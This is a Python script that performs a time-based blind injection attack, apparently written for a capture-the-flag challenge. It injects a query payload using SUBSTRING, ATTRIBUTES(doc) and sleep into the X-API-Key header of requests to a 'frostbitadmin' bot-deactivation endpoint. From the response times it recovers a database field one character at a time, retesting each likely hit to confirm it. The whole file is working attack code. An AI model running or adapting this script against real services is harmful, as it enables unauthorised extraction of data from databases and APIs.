import requests
import time
import string

API_URL = "https://api.frostbit.app/api/v1/frostbitadmin/bot/3462c5eb-4315-4b47-91e2-ed358b5cfd0d/deactivate?debug=true"
HEADERS = {"X-API-Key": "a' OR SUBSTRING(ATTRIBUTES(doc)[{field_index}], {position}, 1) == '{character}' ? sleep(2) : null OR 'a' == 'a"}

CHARACTER_SET = string.ascii_letters + string.digits + "-" + " " + "_={}[]().,@!#$%^&*:/"

# Function to send request and measure response time
def send_request(position, char):
    header = HEADERS["X-API-Key"].format(field_index=0, position=position, character=char)
    start_time = time.time()
    try:
        response = requests.get(API_URL, headers={"X-API-Key": header}, timeout=5)
    except requests.exceptions.Timeout:
        # If the request times out (likely due to SLEEP)
        return 5000
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return -1
    end_time = time.time()
    return (end_time - start_time) * 1000  # Convert to ms

# Function to test a specific character at a given position
def test_character(position, char):
    # First test
    response_time = send_request(position, char)
    if not (2101 <= response_time <= 2600):
        return False
    time.sleep(1)  # Sleep before retesting

    # Second test
    response_time = send_request(position, char)
    if 2101 <= response_time <= 2600:
        return True
    return False

# Main loop to test positions and characters
def main():
    result = []
    for position in range(0, 10):  # Positions 1 to 15
        confirmed_chars = []
        for char in CHARACTER_SET:  # Characters a-z, A-Z, 0-9, and -
            print(f"Testing position {position}, character '{char}'...")
            response_time = send_request(position, char)

            if response_time < 350:
                print(f"Position {position}, character '{char}': True Negative ({response_time:.2f}ms)")
                continue
            elif 351 <= response_time <= 2100:
                print(f"Position {position}, character '{char}': Retest ({response_time:.2f}ms)")
                continue
            elif 2101 <= response_time <= 2600:
                print(f"Position {position}, character '{char}': Possible Positive ({response_time:.2f}ms)")
                if test_character(position, char):
                    print(f"Position {position}, character '{char}' confirmed Positive.")
                    confirmed_chars.append(char)
            else:
                print(f"Position {position}, character '{char}': Retest ({response_time:.2f}ms)")

        # If multiple confirmed positives, retest until only one remains
        while len(confirmed_chars) > 1:
            print(f"Multiple confirmed characters at position {position}: {confirmed_chars}. Retesting...")
            for char in confirmed_chars[:]:
                if not test_character(position, char):
                    print(f"Character '{char}' failed retest and is removed.")
                    confirmed_chars.remove(char)

        if confirmed_chars:
            result.append(confirmed_chars[0])
        else:
            result.append('?')
    print("Final result string:", ''.join(result))

if __name__ == "__main__":
    main()
